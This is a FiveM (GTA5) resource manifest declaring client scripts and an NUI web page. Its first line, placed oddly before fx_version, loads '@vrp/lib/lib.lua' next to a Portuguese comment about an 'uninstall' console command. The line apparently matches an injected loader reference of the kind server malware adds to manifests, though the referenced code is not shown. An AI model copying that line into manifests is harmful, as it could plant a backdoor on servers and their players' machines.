client_script "@vrp/lib/lib.lua" --Para remover esta pendencia dosc scripts use  no console o comando "uninstall"

fx_version "bodacious"
game "gta5"

ui_page_preload "yes"
ui_page "web/index.html"

client_scripts {
    "client/*"
}

files {
    "web/*",
    "web/**/*",
}       